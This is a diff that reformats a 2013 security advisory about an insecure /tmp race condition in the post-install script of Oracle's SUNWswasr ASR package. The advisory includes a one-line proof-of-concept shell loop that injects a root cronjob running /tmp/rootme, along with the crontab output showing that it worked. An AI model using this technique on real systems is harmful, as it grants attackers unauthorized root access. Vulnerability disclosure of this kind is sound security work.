@@ -1,75 +1,84 @@
-                                Advisory #: 11
-Title: SUNWswasr RPM post install /tmp race condition
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-01-31
-Download Site: https://updates.oracle.com/Orion/Services/
-download?type=readme&aru=15864534
-Vendor:Oracle Systems
-Vendor Notified: 2013-01-31
-Vendor Contact: bugtraq email
-Description: Auto Service Request (ASR) is a secure, scalable, customer-
-installable software feature of warranty and Oracle Support Services that
-provides auto-case generation when common hardware component faults occur. ASR
-is designed to enable faster problem resolution by eliminating the need to
-initiate contact with Oracle Support Services for common hardware component
-failures, reducing both the number of phone calls needed and overall phone time
-required. ASR also simplifies support operations by using electronic diagnostic
-data. Easily installed and deployed, ASR is completely controlled by you, the
-customer, to ensure security. ASR is applicable only for component faults. Not
-all component failures are covered, though the most common components (such as
-disk, fan, and power supplies) are covered.
-Vulnerability:
-The post-install script for SUNWswasr RPM handles files in /tmp insecurely. I
-suspect a race condition exists where these two files can be used to either
-clobber root owned files or inject malicious cronjobs into roots cron: /tmp/
-tmpVariable /tmp/crontab_edit [root@oracle-lnx-lab02 ~]# rpm -Uvh SUNWswasr-
-4.3.1-20130117131218.rpm Preparing...
-########################################### [100%] Copyright [2008,2012],
-Oracle and/or its affiliates. All rights reserved. License and Terms of Use for
-this software are described at https://support.oracle.com/ (see Legal Notices
-and Terms of Use). 1:SUNWswasr ###########################################
-[100%] Directory /var/opt/SUNWsasm/configuration/caseinfo created. Directory /
-var/opt/SUNWsasm/configuration/supportfile created. ASR Manager Auto Update
-functionality has been enabled by default. Please ensure that ASR manager is
-registered with ASR backend to get the software updates. Installation of
-SUNWswasr was successful. Lets fireup fsnoop[1] and take a look: [C] -rw-r--r-
-- 1 root root 0 Thu Jan 31 14:30:12 2013 /tmp/crontab_edit [U] -rw-r--r-- 1
-root root 100 Thu Jan 31 14:30:12 2013 /tmp/crontab_edit [C] -rw-r--r-- 1 root
-root 0 Thu Jan 31 14:30:12 2013 /tmp/tmpVariable [U] -rw-r--r-- 1 root root 2
-Thu Jan 31 14:30:12 2013 /tmp/tmpVariable [U] -rw-r--r-- 1 root root 101 Thu
-Jan 31 14:30:12 2013 /tmp/crontab_edit [U] -rw-r--r-- 1 root root 143 Thu Jan
-31 14:30:12 2013 /tmp/crontab_edit [U] -rw-r--r-- 1 root root 188 Thu Jan 31
-14:30:12 2013 /tmp/crontab_edit [D] F /tmp/tmpVariable [D] F /tmp/crontab_edit
-CVE-
-JSON:Export
-Exploit Code:
-   1. I was able to inject my own cronjob in as root with the following simple
-      PoC:
-   2.  
-   3. $ while (true) ;do echo "* * * * * /tmp/rootme" >> /tmp/crontab_edit;
-      done
-   4.  
-   5. [root@oracle-lnx-lab02 ~]# crontab -l
-   6. 0,12,24,36,48 * * * * /opt/SUNWsasm/bin/sasm start-instance > /dev/null
-      2>&1
-   7.  
-   8. * * * * * /tmp/rootme <--- prepended and contains our malicious shell/
-      binary, see exploit above.
-   9. ##Cronjob entry for ASR Auto Rules Update
-  10. 7 3 * * * /opt/SUNWswasr/bin/update_rules.sh
-  11.  
-  12. The uninstall script is just as sloppy:
-  13.  
-  14. [C] F /tmp/asrtab.??
-  15. [U] F /tmp/asrtab.??
-  16. [C] F /tmp/asrtab.???
-  17. [U] F /tmp/asrtab.???
-  18. [C] F /tmp/asrtab.???
-  19. [U] F /tmp/asrtab.???
-  20. [D] F /tmp/asrtab.??
-  21.  
-  22. did they mean to use $$ for process Pid?
-  23.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/Oracle_ASR_4.3.1-root-
-install.html
+
+                               Advisory #: 11
+
+   Title: SUNWswasr RPM post install /tmp race condition
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-01-31
+   Download Site:
+   https://updates.oracle.com/Orion/Services/download?type=readme&aru=1586
+   4534
+   Vendor: Oracle Systems
+   Vendor Notified: 2013-01-31
+   Vendor Contact: bugtraq email
+   Description: Auto Service Request (ASR) is a secure, scalable,
+   customer-installable software feature of warranty and Oracle Support
+   Services that provides auto-case generation when common hardware
+   component faults occur. ASR is designed to enable faster problem
+   resolution by eliminating the need to initiate contact with Oracle
+   Support Services for common hardware component failures, reducing both
+   the number of phone calls needed and overall phone time required. ASR
+   also simplifies support operations by using electronic diagnostic data.
+   Easily installed and deployed, ASR is completely controlled by you, the
+   customer, to ensure security. ASR is applicable only for component
+   faults. Not all component failures are covered, though the most common
+   components (such as disk, fan, and power supplies) are covered.
+   Vulnerability:
+   The post-install script for SUNWswasr RPM handles files in /tmp
+   insecurely. I suspect a race condition exists where these two files can
+   be used to either clobber root owned files or inject malicious cronjobs
+   into roots cron: /tmp/tmpVariable /tmp/crontab_edit
+   [root@oracle-lnx-lab02 ~]# rpm -Uvh SUNWswasr-4.3.1-20130117131218.rpm
+   Preparing... ########################################### [100%]
+   Copyright [2008,2012], Oracle and/or its affiliates. All rights
+   reserved. License and Terms of Use for this software are described at
+   https://support.oracle.com/ (see Legal Notices and Terms of Use).
+   1:SUNWswasr ########################################### [100%]
+   Directory /var/opt/SUNWsasm/configuration/caseinfo created. Directory
+   /var/opt/SUNWsasm/configuration/supportfile created. ASR Manager Auto
+   Update functionality has been enabled by default. Please ensure that
+   ASR manager is registered with ASR backend to get the software updates.
+   Installation of SUNWswasr was successful. Lets fireup fsnoop[1] and
+   take a look: [C] -rw-r--r-- 1 root root 0 Thu Jan 31 14:30:12 2013
+   /tmp/crontab_edit [U] -rw-r--r-- 1 root root 100 Thu Jan 31 14:30:12
+   2013 /tmp/crontab_edit [C] -rw-r--r-- 1 root root 0 Thu Jan 31 14:30:12
+   2013 /tmp/tmpVariable [U] -rw-r--r-- 1 root root 2 Thu Jan 31 14:30:12
+   2013 /tmp/tmpVariable [U] -rw-r--r-- 1 root root 101 Thu Jan 31
+   14:30:12 2013 /tmp/crontab_edit [U] -rw-r--r-- 1 root root 143 Thu Jan
+   31 14:30:12 2013 /tmp/crontab_edit [U] -rw-r--r-- 1 root root 188 Thu
+   Jan 31 14:30:12 2013 /tmp/crontab_edit [D] F /tmp/tmpVariable [D] F
+   /tmp/crontab_edit
+   CVE-
+   JSON: Export
+   Exploit Code:
+
+    1. I was able to inject my own cronjob in as root with the following
+       simple PoC:
+    2.
+    3. $ while (true) ;do echo "* * * * * /tmp/rootme" >>
+       /tmp/crontab_edit; done
+    4.
+    5. [root@oracle-lnx-lab02 ~]# crontab -l
+    6. 0,12,24,36,48 * * * * /opt/SUNWsasm/bin/sasm start-instance >
+       /dev/null 2>&1
+    7.
+    8. * * * * * /tmp/rootme <--- prepended and contains our malicious
+       shell/binary, see exploit above.
+    9. ##Cronjob entry for ASR Auto Rules Update
+   10. 7 3 * * * /opt/SUNWswasr/bin/update_rules.sh
+   11.
+   12. The uninstall script is just as sloppy:
+   13.
+   14. [C] F /tmp/asrtab.??
+   15. [U] F /tmp/asrtab.??
+   16. [C] F /tmp/asrtab.???
+   17. [U] F /tmp/asrtab.???
+   18. [C] F /tmp/asrtab.???
+   19. [U] F /tmp/asrtab.???
+   20. [D] F /tmp/asrtab.??
+   21.
+   22. did they mean to use $$ for process Pid?
+   23.
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/Oracle_ASR_4.3.1-root-install.html
